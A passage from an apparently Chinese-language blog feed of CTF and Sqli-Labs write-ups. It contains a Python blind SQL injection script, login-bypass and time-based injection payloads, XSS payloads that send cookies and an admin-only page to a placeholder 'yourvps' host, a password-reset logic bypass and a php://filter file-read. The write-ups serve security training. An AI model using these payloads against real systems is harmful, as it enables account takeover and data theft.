class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">'admin") and%09(%09select%09ascii(substr('</span> +generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/10.png?raw=true" alt=""></p>
<p>注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-15 POST- Blind-Boolian/time Based -Single quotes&lt;br&gt;Less-16 POST- Blind-Boolian/time Based -Double quotes&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less13~14-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/</id>
    <published>2017-08-23T09:23:54.000Z</published>
    <updated>2017-08-23T10:05:51.899Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-13 POST- Double Injection -Single quotes -String-with twist<br>Less-14 POST- Double Injection -Single quotes -String-with twist<br><a id="more"></a></p>
<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>说明有括号保护，需闭合。</p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less 14"></a>Less 14</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>从以上几条语句知道，需要闭合双引号。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>页面返回提示说已经登陆成功。</p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-13 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;Less-14 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less11~12-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/</id>
    <published>2017-08-23T08:47:48.000Z</published>
    <updated>2017-08-23T10:05:52.704Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-11 POST-Error Based -Single quotes- String<br>Less-12 POST - Error Based -Double quotes - String<br><a id="more"></a><br>考察post注入，所以要借助工具。比如burp。</p>
<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h1><p>当post的数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>当post数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>用如下payload即可登陆成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这样后台的语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h1><p>和Less 11差不多，将单引号换成双引号。</p>
<p>post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>发现有括号保护。</p>
<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less8~10-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
    <published>2017-08-23T07:58:33.000Z</published>
    <updated>2017-08-23T08:32:00.539Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
<p>发现有 字符串<code>You are in...........</code></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 2=1 %23</div></pre></td></tr></table></figure></p>
<p>发现字符串消失。因此我们可以利用基于页面的变化来进行盲注。<br>比如以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database(),1,1))&lt;= 255 )%23</div><div class="line"></div><div class="line"></div><div class="line">http://localhost:20000/sqllab/Less-8/?id=-1&apos; or ( select ascii(substr(database() from 1 for 1))&lt;= 255 )%23</div></pre></td></tr></table></figure></p>
<p>即可根据二分法得到数据库名称。</p>
<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less 9"></a>Less 9</h1><p>该关为GET-Time based - Single Quotes。基于时间的盲注<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(5) %23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/1.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and sleep(10) %23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/2.png?raw=true" alt=""></p>
<p>可以看到我们的sleep语句被带到了sql数据库中执行。</p>
<p>接下去可以利用sql中的if语句来进行注入，当条件正确则返回1，若不正确则sleep。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/3.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/4.png?raw=true" alt=""></p>
<p>之后利用脚本即可获取数据库名称。</p>
<h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less 10"></a>Less 10</h1><p>Less-10 GET-Blind-Time based - double quotes<br>这个跟Less 9一样，只是由单引号变为了双引号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/5.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,sleep(10) )%23</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/6.png?raw=true" alt=""></p>
<p>除了sleep，还有benchmark函数来进行时间盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BENCHMARK(count,expr)</div></pre></td></tr></table></figure>
<p>BENCHMARK()函数重复countTimes次执行表达式expr</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;255,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/7.png?raw=true" alt=""></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-10/?id=1&quot; and if(ascii(substr(database(),1,1))&lt;0,1,benchmark(10000000,md5(&apos;a&apos;)) )%23</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/8.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-8 GET-Blind-Boolean Based- Single Quotes&lt;br&gt;Less-9 GET-Time based - Single Quotes&lt;br&gt;Less-10 GET-Blind-Time based - double quotes&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-XSS-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/"/>
    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-XSS-writeup/</id>
    <published>2017-08-22T10:19:15.000Z</published>
    <updated>2017-08-22T13:50:23.910Z</updated>
    
    <content type="html"><![CDATA[<p>xss<br><a id="more"></a></p>
<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:33323/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看csp头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot;</div></pre></td></tr></table></figure></p>
<p>这里给出一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">    var head = document.getElementsByTagName(&quot;head&quot;)[0]</div><div class="line">    var n0t = document.createElement(&quot;link&quot;);</div><div class="line">    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</div><div class="line">    n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie);</div><div class="line">    head.appendChild(n0t);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/9.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;BeVEn_CSP_you_G37_mY_C00K1e&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:43425</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
<p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
<p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xss&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-比赛系统-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/"/>
    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-比赛系统-writeup/</id>
    <published>2017-08-22T09:31:20.000Z</published>
    <updated>2017-08-22T09:32:44.696Z</updated>
    
    <content type="html"><![CDATA[<p>逻辑问题、任意用户密码重置<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8013</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>有登陆和注册的功能，其中登陆处还有忘记密码。结合url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8013/logic2_regist.php</div><div class="line">http://202.112.51.217:8013/logic2_login.php</div></pre></td></tr></table></figure></p>
<p>猜测应该是逻辑问题。</p>
<p>我们注册一个账号</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/4.png?raw=true" alt=""></p>
<p>对我这个账号而言，其密保问题和答案均为chybeta</p>
<p>接下来看看登陆功能，用刚刚注册的账号登陆，得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">普通用户登录成功,没什么用</div></pre></td></tr></table></figure></p>
<p>那估计要登陆超级用户咯，比如admin。接下来用到忘记密码功能。</p>
<p>我们先输入用户名<code>chybeta</code>，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/5.png?raw=true" alt=""><br>输入密保答案<code>chybeta</code></p>
<p>抓包！</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/6.png?raw=true" alt=""></p>
<p>可以看到有个username字段。我们猜测后端忘记密码的流程是这样的，先从数据库中抽取与用户名相对应的密保问题与答案，之后只要判断我们输入的答案是否和密保答案是否一致即可修改密码，而没有再一次的检查用户名。所以可能存在任意用户密码重置漏洞。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/7.png?raw=true" alt=""></p>
<p>修改username为admin，然后forward掉。然后就可以重置admin的密码了。</p>
<p>重置后登陆得到；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;You_Kookokoko_logic_OK&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逻辑问题、任意用户密码重置&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XMAN夏令营-2017-babyweb-writeup</title>
    <link href="http://yoursite.com/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/"/>
    <id>http://yoursite.com/2017/08/22/XMAN夏令营-2017-babyweb-writeup/</id>
    <published>2017-08-22T09:31:10.000Z</published>
    <updated>2017-08-22T09:31:33.749Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传、php伪协议、文件包含<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199</div></pre></td></tr></table></figure></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个图片上传功能（submit），还有一个图片查看功能（view）。点击后可发现url是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=submit</div><div class="line">http://202.112.51.217:8199/index.php?page=view</div></pre></td></tr></table></figure></p>
<p>在submit处有上传功能，对应的页面是upload.php。</p>
<p>猜测有包含漏洞，用php伪协议读取源码，其余类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure></p>
<p>upload.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div 